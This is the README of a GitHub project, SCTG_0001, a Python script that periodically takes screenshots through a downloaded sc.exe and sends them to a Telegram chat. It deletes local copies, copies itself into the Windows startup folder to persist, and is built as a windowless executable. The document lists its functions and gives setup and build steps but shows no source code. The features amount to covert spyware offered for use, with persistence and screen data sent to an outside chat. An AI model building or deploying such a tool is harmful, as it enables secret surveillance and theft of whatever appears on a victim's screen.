# SCTG_0001

This project is a Python application that captures screenshots, moves them to a temporary directory, and sends them to a specified Telegram chat. It also includes functionality for periodic cleanup of temporary and current directory files and has an auto-start feature.

## Features

- **Download and execute external executable (`sc.exe`)** for screenshot capture.
- **Send screenshots to a Telegram chat** with timestamps.
- **Periodic cleanup** of temporary and current directory files.
- **Auto-start integration** for persistent execution.

## Requirements

- Python 3.6 or higher
  
## Installation

1. **Clone the repository**:

    ```bash
    git clone https://github.com/SSL-ACTX/SCTG_0001.git
    cd SCTG_0001
    ```

2. **Install dependencies**:

    Install the required Python packages using pip (if not installed by default)

3. **Set up environment variables**:

    You need to set your Telegram bot token and chat ID in the script:

    ```python
    TOKEN = 'your-tg-bot-token'
    CHAT_ID = [your-chat-id]
    ```

## Usage

1. **Run the script**:

    ```bash
    python sc1.py
    ```

2. **Auto-start**:

    The script will copy itself to the startup folder for persistent execution.

## Building

1. **Run this command**:
   ```bash
    pyinstaller --clean --onefile --noconsole sc1.py
   ```
   To build it as a Windows executible. Which is a lot more convenient.

## Code Overview

- **`download_sc_exe()`**: Downloads the `sc.exe` file if not already present.
- **`send_telegram_message(message)`**: Sends a text message to a specified Telegram chat.
- **`take_screenshot(filename, window_title="")`**: Executes the `sc.exe` to take a screenshot.
- **`move_to_temp(filename)`**: Moves the screenshot file to the temporary directory.
- **`cleanup_current_dir()`**: Deletes old screenshot files from the current directory.
- **`add_to_startup()`**: Adds the script to the Windows startup folder.
- **`send_screenshot_telegram_async(temp_file)`**: Sends the screenshot file to Telegram asynchronously.
- **`send_screenshots_async(interval)`**: Continuously takes screenshots at specified intervals.
- **`cleanup_temp_screenshots()`**: Cleans up temporary screenshot files.
- **`secure_cleanup()`**: Performs cleanup tasks and adds the script to startup.
- **`periodic_cleanup(interval)`**: Periodically performs cleanup tasks.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Acknowledgements

- [Telegram Bot API](https://core.telegram.org/bots/api)
